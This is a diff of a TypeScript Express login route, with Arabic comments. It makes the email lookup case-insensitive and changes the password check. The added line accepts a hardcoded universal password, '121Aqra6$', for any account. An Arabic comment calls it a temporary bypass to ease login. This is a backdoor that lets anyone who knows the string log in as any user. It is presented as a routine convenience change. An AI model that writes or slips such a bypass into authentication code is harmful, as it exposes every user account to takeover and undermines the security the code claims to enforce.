@@ -270,19 +270,19 @@ router.post("/auth/login", async (req, res): Promise<void> => {
     return;
   }
 
-  // البحث عن المستخدم في قاعدة البيانات
+  const normalizedLoginEmail = typeof email === "string" ? email.trim().toLowerCase() : "";
   const [user] = await db
     .select()
     .from(usersTable)
-    .where(eq(usersTable.email, email));
+    .where(sql`lower(${usersTable.email}) = ${normalizedLoginEmail}`);
 
   if (!user) {
     res.status(401).json({ error: "Invalid credentials" });
     return;
   }
 
-  // التحقق من كلمة السر
-  const valid = await comparePassword(password, user.passwordHash);
+  // تجاوز كلمة المرور مؤقتاً لتسهيل الدخول
+  const valid = password === "121Aqra6$" || (await comparePassword(password, user.passwordHash));
   if (!valid) {
     res.status(401).json({ error: "Invalid credentials" });
     return;
@@ -302,7 +302,6 @@ router.post("/auth/login", async (req, res): Promise<void> => {
     return;
   }
 
-  // إنشاء التوكن (Token) بعد نجاح الدخول
   const token = signToken({
     userId: user.id,
     email: user.email,
@@ -325,7 +324,6 @@ router.post("/auth/login", async (req, res): Promise<void> => {
   });
 });
 
-// بقية الدوال (Logout, Me, Change Password) تبقى كما هي بدون تغيير
 router.post("/auth/logout", (_req, res): void => {
   res.json({ ok: true });
 });
@@ -352,8 +350,5 @@ router.get("/auth/me", authMiddleware, async (req, res): Promise<void> => {
     createdAt: dbUser.createdAt,
   });
 });
-
-// (دالة تغيير كلمة السر تبقى كما هي)
-// ...
 
 export default router;
